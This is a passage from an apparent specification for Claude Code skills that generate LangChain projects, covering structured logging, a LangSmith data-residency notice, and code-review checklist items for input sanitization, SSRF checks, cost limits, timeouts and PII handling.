  periodSeconds: 10
  timeoutSeconds: 5
  failureThreshold: 3
```

Invariant: `timeoutSeconds` < `periodSeconds` on every probe.

**Section 9 "” Structured Logging with structlog:**

```python
# src/logging_config.py
def configure_logging(log_level: str = "INFO") -> None:
    processors = [
        structlog.contextvars.merge_contextvars,
        structlog.stdlib.add_log_level,
        structlog.stdlib.add_logger_name,
        structlog.processors.TimeStamper(fmt="iso"),
        _add_service_fields,
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        structlog.processors.JSONRenderer() if os.getenv("APP_ENV") == "production"
        else structlog.dev.ConsoleRenderer(),
    ]
    structlog.configure(processors=processors)
    # Bridge stdlib logging through structlog
    logging.basicConfig(format="%(message)s", level=log_level, stream=sys.stdout)
```

```python
# src/graph.py "” per-node logging pattern
def bind_run_context(config: RunnableConfig) -> None:
    """Call once in entry node; all subsequent nodes inherit via contextvars."""
    structlog.contextvars.bind_contextvars(
        run_id=str(config.get("run_id", "")),
        thread_id=config["configurable"].get("thread_id", ""),
        user_id=config["configurable"].get("user_id", ""),
    )

def my_node(state: AgentState, config: RunnableConfig) -> AgentState:
    node_log = structlog.get_logger().bind(node="my_node")
    node_log.info("node_start")
    # ... node logic ...
    node_log.info("node_end", tokens_used=usage)
    return updated_state
```

```python
# src/middleware.py
class RequestIDMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        request_id = request.headers.get("X-Request-ID") or str(uuid4())
        structlog.contextvars.clear_contextvars()
        structlog.contextvars.bind_contextvars(request_id=request_id)
        log.info("request_start", method=request.method, path=request.url.path)
        response = await call_next(request)
        response.headers["X-Request-ID"] = request_id
        log.info("request_end", status_code=response.status_code)
        return response
```

Standard field glossary: `service`, `version`, `env`, `request_id`, `run_id`, `thread_id`, `user_id`, `node` "” source and purpose of every field in every JSON log line.

---

### Extension 15: lc:graph Functional API + lc:agent Event-Driven cross-reference note

Already covered in Extensions 1 and 2 above. No additional content.

---

## Updated Cross-Cutting Concerns

### LangSmith Data Residency Disclosure

Add to ALL generated projects (in `lc:start`, `lc:scaffold`, and any skill that generates a full project structure):

1. **In `.env.example`** "” add this comment block:
```bash
# ============================================================
# LANGSMITH "” DATA RESIDENCY NOTICE
# LangSmith sends all LLM inputs and outputs to LangChain Inc.
# servers in the United States.
# For EU data: GDPR Art. 46 cross-border transfer applies.
# For health data: HIPAA BAA required (not included in standard plan).
# To suppress content transmission (not metadata):
#   LANGSMITH_HIDE_INPUTS=true
#   LANGSMITH_HIDE_OUTPUTS=true
# For self-hosted alternatives: run lc:monitor
# ============================================================
LANGSMITH_API_KEY=your_langsmith_api_key_here
LANGSMITH_TRACING=true
LANGSMITH_PROJECT=my-project
```

2. **In any generated `README.md`** (if generated) "” include a "Data and Privacy" section pointing to `lc:compliance` for regulated use cases.

3. **In `lc:start` STEP 10** "” display the full interactive disclosure (see Extension 10, Addition 1).

---

### New lc-coder Checklist Items (16-20)

Add to `.claude/skills/lc-coder/AGENT.md` "Mandatory "” Zero Exceptions" section:

**Item 16 "” INPUT SANITIZATION**
If `user_input` appears anywhere in the state `TypedDict`, a `sanitize_input` node MUST appear as an `add_node` call before the agent node. Grep check: `sanitize_input` must appear in `add_node` calls. Reference: `lc:guardrails` Pattern 1.

**Item 17 "” SSRF VALIDATION**
Every `@tool` that calls `requests.get`, `httpx.get`, `httpx.post`, or `aiohttp.ClientSession.get` with a user-derived URL MUST contain an IP-range helper (e.g. `_assert_public_url` or `_assert_safe_url`) called before the HTTP request. Grep check: helper call must precede the HTTP call within the tool function body.

**Item 18 "” COST CIRCUIT BREAKER**
When `graph.ainvoke` or `app.ainvoke` appears anywhere in the project, `CostCircuitBreaker` MUST appear in `config["callbacks"]` at the invocation site. Grep check: `CostCircuitBreaker` must appear within 10 lines of any `ainvoke` call. Reference: `lc:guardrails` Pattern 4.

**Item 19 "” TIMEOUT WRAPPING**
Every `await.*\.ainvoke` call MUST be wrapped with `asyncio.wait_for(..., timeout=N)`. Default constant: `_LLM_TIMEOUT_S = float(os.getenv("LLM_TIMEOUT_S", "30"))`. Grep check: every `await.*\.ainvoke` must have an enclosing `asyncio.wait_for` in the same function scope.

**Item 20 "” USER_ID IN MULTI-USER GRAPHS**
When `thread_id` is present in the state `TypedDict` AND the description implies multi-tenant use, `user_id: str` MUST also appear in the state `TypedDict` AND in `config["configurable"]`. Never defaults to `"anon"`. Grep check: `user_id` must appear alongside `thread_id` in the `TypedDict` definition.

**Structural Checks (Grep-based) additions:**
```
sanitize_input      must appear as add_node call if user_input in state TypedDict
_assert_safe_url    must appear before requests.get/httpx.get in @tool bodies  
CostCircuitBreaker  must appear in callbacks config when graph.ainvoke present
asyncio.wait_for    must wrap every await.*\.ainvoke call
user_id             must appear in state TypedDict and configurable dict when
                    thread_id present and description implies multi-user
```

---

### New lc-reviewer Dimension 3 Expansions

Add to `.claude/skills/lc-reviewer/AGENT.md` "Dimension 3 "” SECURITY" table:

| Check | Indicator | Severity |
|-------|-----------|----------|
| Indirect prompt injection via tool result | Unsanitized tool output appended to messages without `ToolOutputSanitizer` | HIGH |
| SSRF in HTTP tools | `requests.get(url)` or `httpx.get(url)` with user-derived URL, no IP range validation before request | HIGH |
| Path traversal in file tools | `open(user_supplied_path)` or `Path(user_input)` without `.resolve()` + allowed-directory `.relative_to()` check | HIGH |
| Missing cost circuit breaker | `graph.ainvoke` or `app.ainvoke` present without `CostCircuitBreaker` in `config["callbacks"]` | HIGH (not MEDIUM "” runaway cost is a production incident) |
| PII fields in LangSmith metadata | State fields named `email`, `name`, `ssn`, `phone`, `address`, `dob` fully traced with no `LANGSMITH_HIDE_INPUTS` or field-level redaction | HIGH (privacy violation, potential GDPR/HIPAA exposure) |

---

## Updated Build Notes

### Complete File Count

| Category | Count |
|----------|-------|
| Original skills | 14 |
| New skills (this addition) | 9 |
| Original commands | 6 |
| New commands (this addition) | 5 |
| Agent files (lc-coder, lc-reviewer) | 2 |
| Configuration files | 3 |
| **Total** | **39** |

### All New File Paths

**New skill files (9):**
```
.claude/skills/lc-guardrails/SKILL.md
.claude/skills/lc-providers/SKILL.md
.claude/skills/lc-resilience/SKILL.md
.claude/skills/lc-audit/SKILL.md
.claude/skills/lc-compliance/SKILL.md
.claude/skills/lc-data/SKILL.md
.claude/skills/lc-vectorstore/SKILL.md
.claude/skills/lc-multimodal/SKILL.md
.claude/skills/lc-ui/SKILL.md
```

**New command files (5):**
```
.claude/commands/lc-guard.md
.claude/commands/lc-antipatterns.

